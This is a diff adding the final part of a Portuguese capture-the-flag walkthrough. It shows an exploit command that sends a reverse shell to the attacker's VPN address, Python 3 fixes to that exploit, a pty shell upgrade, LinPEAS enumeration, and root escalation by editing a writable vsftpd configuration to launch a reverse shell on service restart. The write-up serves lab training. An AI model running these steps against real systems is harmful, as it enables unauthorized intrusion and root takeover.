@@ -55,5 +55,42 @@ Vamos tentar algumas
 E ```password``` era a correta. Temos acesso!  
 Agora que conhecemos sua senha, vamos utilizar-se do exploit encontrado para ganhar uma shell
 > ```bash
-> python2 [filename].py http://[ip_address]:62337/ john password [vpn_ip_address] [port] linux
+> python3 [filename].py http://[ip_address]:62337/ john password [vpn_ip_address] [port] linux
 > ```
+
+Foram necessárias alterações no código base como
+* colocar () em todos os _prints_
+* na linha 23, alterar _content = response.read()_, para _content = response.content.decode()_
+* na linha 105, alterar _ans = raw_input("[Y/n] ").lower()_, para _ans = input("[Y/n] ").lower()_
+
+![](code_alter.jpg)
+
+![](shell.jpg)
+
+## _**Escalando privilégios**_
+Primeiro, vamos transferir <mark>LinPeas</mark> para a máquina-alvo e executar  
+
+![](creds.jpg)
+
+Parece que encontramos credenciais de uso do usuário  
+Vamos realizar _upgrade_ de nossa shell e entrar no usuário  
+> ```bash
+> python3 -c 'import pty, os; pty.spawn("/bin/bash")'
+> ```
+
+![](drac_login.jpg)
+
+Como temos senha, vamos executar o comando ```sudo -l```  
+
+![](sudo_return.jpg)
+
+Parece que podemos reiniciar o serviço **FTP** como _root_  
+Vamos ver se temos permissão para editar o arquivo _.vsftpd.config_  
+Com um simples ```ls -la```, verificamos que é possível!  
+Podemos então editar e executar nosso shell reverso  
+Assim, quando reiniciarmos o vsftpd como root, obteremos um shell reverso como root  
+Alteramos o arquivo com ```nano```, utilizamos o comando ```systemctl daemon-reload``` para gravar as alterações e por fim, executamos ```/usr/sbin/service vsftpd restart```  
+
+![](root.jpg)
+
+Agora, basta ir atrás das flags!
